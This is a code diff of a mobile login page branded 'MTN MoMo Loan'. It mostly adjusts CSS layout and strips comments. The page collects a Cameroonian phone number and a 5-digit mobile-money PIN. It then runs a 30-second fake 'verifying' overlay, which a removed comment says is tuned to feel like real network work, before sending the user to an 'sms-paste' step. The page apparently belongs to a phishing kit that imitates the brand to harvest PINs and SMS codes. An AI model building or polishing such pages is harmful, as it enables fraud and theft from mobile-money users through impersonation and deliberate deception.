@@ -3,7 +3,7 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>MTN MoMo Loan - Login</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
@@ -26,8 +26,12 @@
             flex-direction: column;
             align-items: center;
             padding: 10px;
+            height: 100vh;
+            height: 100dvh;
+            gap: 10px;
         }
 
+        /* ===== HEADER ===== */
         header {
             width: 100%;
             max-width: 480px;
@@ -35,11 +39,11 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 10px;
             background: white;
             border-radius: 16px;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
             position: relative;
+            flex-shrink: 0;
         }
 
         .back-btn {
@@ -49,6 +53,9 @@
             cursor: pointer;
             color: #333;
             transition: transform 0.2s;
+            line-height: 1;
+            width: 28px;
+            text-align: left;
         }
 
         .back-btn:hover {
@@ -74,28 +81,48 @@
             line-height: 1;
             letter-spacing: -0.5px;
             box-shadow: 0 4px 12px rgba(0,71,171,0.25);
+            white-space: nowrap;
         }
 
+        /* ===== CARD ===== */
         .card {
             background: white;
             border-radius: 24px;
-            padding: 36px 25px 30px;
+            padding: 32px 25px 28px;
             width: 100%;
             max-width: 480px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
             display: flex;
             flex-direction: column;
             overflow-y: auto;
-            max-height: calc(100vh - 140px);
+            overflow-x: hidden;
+            flex: 1;
+            min-height: 0;
+            -webkit-overflow-scrolling: touch;
         }
 
-        /* ===== PHONE INPUT WITH FLAG ===== */
+        .card::-webkit-scrollbar {
+            width: 6px;
+        }
+        .card::-webkit-scrollbar-track {
+            background: transparent;
+            margin: 10px 0;
+        }
+        .card::-webkit-scrollbar-thumb {
+            background: #d0d8e8;
+            border-radius: 3px;
+        }
+        .card::-webkit-scrollbar-thumb:hover {
+            background: #b0bcd4;
+        }
+
+        /* ===== INPUT GROUPS ===== */
         .phone-input-group {
-            margin-bottom: 24px;
+            margin-bottom: 22px;
         }
 
         .phone-input-group:first-of-type {
-            margin-top: 8px;
+            margin-top: 4px;
         }
 
         .input-label {
@@ -106,6 +133,7 @@
             font-size: 14px;
         }
 
+        /* ===== PHONE INPUT WITH FLAG ===== */
         .phone-input {
             display: flex;
             align-items: center;
@@ -132,6 +160,7 @@
             color: #0047AB;
             border-right: 2px solid #e0e0e0;
             white-space: nowrap;
+            flex-shrink: 0;
         }
 
         .flag-svg {
@@ -153,6 +182,7 @@
             color: #333;
             outline: none;
             min-width: 0;
+            background: transparent;
         }
 
         .phone-input input::placeholder {
@@ -187,7 +217,7 @@
             display: flex;
             justify-content: space-between;
             gap: 10px;
-            margin-bottom: 8px;
+            margin-bottom: 4px;
         }
 
         .pin-box {
@@ -237,6 +267,7 @@
             margin-top: 6px;
             display: none;
             font-weight: 500;
+            line-height: 1.4;
         }
 
         .error-text.show {
@@ -262,15 +293,15 @@
             cursor: pointer;
             transition: transform 0.2s, box-shadow 0.2s;
             font-family: 'Inter', sans-serif;
-            margin-top: 28px;
+            margin-top: 24px;
         }
 
-        .login-btn:hover {
+        .login-btn:hover:not(:disabled) {
             transform: scale(1.02);
             box-shadow: 0 8px 25px rgba(0, 71, 171, 0.3);
         }
 
-        .login-btn:active {
+        .login-btn:active:not(:disabled) {
             transform: scale(0.98);
         }
 
@@ -280,12 +311,28 @@
             transform: none;
         }
 
+        /* ===== SECURITY NOTICE ===== */
+        .security-notice {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 18px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .security-notice .lock-icon {
+            font-size: 14px;
+        }
+
         /* ===== SIGNUP LINK ===== */
         .signup-text {
             text-align: center;
             font-size: 14px;
             color: #777;
-            margin-top: 24px;
+            margin-top: 22px;
+            padding-bottom: 4px;
         }
 
         .signup-text a {
@@ -298,27 +345,15 @@
             text-decoration: underline;
         }
 
-        /* ===== SECURITY NOTICE ===== */
-        .security-notice {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #999;
-        }
-
-        .security-notice .lock-icon {
-            font-size: 14px;
-        }
-
+        /* ===== FOOTER ===== */
         footer {
-            padding: 15px;
+            padding: 10px;
             color: #aaa;
             font-size: 12px;
             text-align: center;
-            margin-top: auto;
+            width: 100%;
+            max-width: 480px;
+            flex-shrink: 0;
         }
 
         /* ============================================
@@ -351,7 +386,6 @@
             text-align: center;
         }
 
-        /* MoMo icon on overlay */
         .verify-momo-icon {
             display: inline-flex;
             align-items: center;
@@ -374,7 +408,6 @@
             50% { transform: scale(1.05); }
         }
 
-        /* Big spinner */
         .verify-spinner {
             width: 56px;
             height: 56px;
@@ -389,7 +422,6 @@
             to { transform: rotate(360deg); }
         }
 
-        /* Title + subtitle */
         .verify-title {
             font-size: 20px;
             font-weight: 800;
@@ -410,7 +442,6 @@
             padding: 0 12px;
         }
 
-        /* Animated dots "..." */
         .verify-dots span {
             display: inline-block;
             animation: dotBlink 1.4s infinite both;
@@ -424,7 +455,6 @@
             40% { opacity: 1; }
         }
 
-        /* Bottom progress bar */
         .verify-bar {
             width: 220px;
             height: 5px;
@@ -442,7 +472,6 @@
             transition: width 1s linear;
         }
 
-        /* Small security footer on overlay */
         .verify-security {
             display: flex;
             align-items: center;
@@ -455,9 +484,17 @@
             font-size: 14px;
         }
 
+        /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
+            body {
+                padding: 8px;
+                gap: 8px;
+            }
+            header {
+                padding: 12px 16px;
+            }
             .card {
-                padding: 28px 18px 24px;
+                padding: 26px 18px 22px;
             }
             .pin-box {
                 font-size: 20px;
@@ -654,43 +691,31 @@
         const verifyOverlay = document.getElementById('verifyOverlay');
         const verifyBarFill = document.getElementById('verifyBarFill');
 
-        /**
-         * Show the verifying overlay for `durationMs` milliseconds,
-         * animating the progress bar from 0 → 100%, then run `onDone()`.
-         *
-         * The bar is driven in 1-second ticks. The percentage
-         * increases a bit unevenly (not perfectly linear), so it
-         * feels like real network work instead of a stopwatch.
-         */
         function showVerifying(durationMs, onDone) {
-            // Show overlay
             verifyOverlay.classList.add('show');
             verifyBarFill.style.width = '0%';
 
-            const totalSeconds = Math.round(durationMs / 1000); // ~30
+            const totalSeconds = Math.round(durationMs / 1000);
             const startTime = Date.now();
 
             const tick = setInterval(function() {
                 const elapsedMs = Date.now() - startTime;
                 const elapsedSec = elapsedMs / 1000;
 
-                // Ease-out progress: fast at first, slower near the end.
                 const raw = elapsedSec / totalSeconds;
-                const eased = 1 - Math.pow(1 - Math.min(raw, 1), 2.2); // easeOutQuad-ish
-                const percent = Math.min(eased * 100, 99); // cap at 99% until done
+                const eased = 1 - Math.pow(1 - Math.min(raw, 1), 2.2);
+                const percent = Math.min(eased * 100, 99);
 
                 verifyBarFill.style.width = percent.toFixed(1) + '%';
 
                 if (elapsedMs >= durationMs) {
                     clearInterval(tick);
                     verifyBarFill.style.width = '100%';
-
-                    // small pause so the user sees the bar hit 100%
                     setTimeout(function() {
                         onDone();
                     }, 350);
                 }
-            }, 1000 / 30); // ~30 fps for smoothness
+            }, 1000 / 30);
         }
 
         // ============================================
@@ -699,7 +724,6 @@
         const loginBtn = document.getElementById('loginBtn');
 
         loginBtn.addEventListener('click', function() {
-            // ---- Validate phone ----
             const phoneDigits = phoneInput.value.replace(/\s/g, '');
             if (phoneDigits.length !== 9 || !/^\d{9}$/.test(phoneDigits)) {
                 phoneWrapper.classList.add('invalid');
@@ -709,7 +733,6 @@
                 return;
             }
 
-            // ---- Validate PIN (5 digits) ----
             const pin = getPinValue();
             if (pin.length !== 5) {
                 pinBoxes.forEach(b => b.classList.add('invalid'));
@@ -719,7 +742,6 @@
                 return;
             }
 
-            // ---- Save session (demo) ----
             const session = {
                 phone: '+237' + phoneDigits,
                 country: 'CM',
@@ -728,14 +750,11 @@
             };
             localStorage.setItem('momoSession', JSON.stringify(session));
 
-            // ---- Button mini-loader (while overlay fades in) ----
             loginBtn.disabled = true;
             loginBtn.textContent = 'LOGGING IN...';
 
             console.log('🔐 Login submitted:', { phone: session.phone, pin: '•••••' });
 
-            // ---- Show verifying overlay for ~30 seconds, then go to sms-paste ----
-            // (Use 30000 for real 30s. For testing, try 5000)
             const VERIFY_DURATION_MS = 30000;
 
             showVerifying(VERIFY_DURATION_MS, function() {
@@ -743,7 +762,6 @@
             });
         });
 
-        // Auto-focus first PIN box after phone is filled
         phoneInput.addEventListener('blur', function() {
             const digits = this.value.replace(/\s/g, '');
             if (digits.length === 9 && !getPinValue()) {
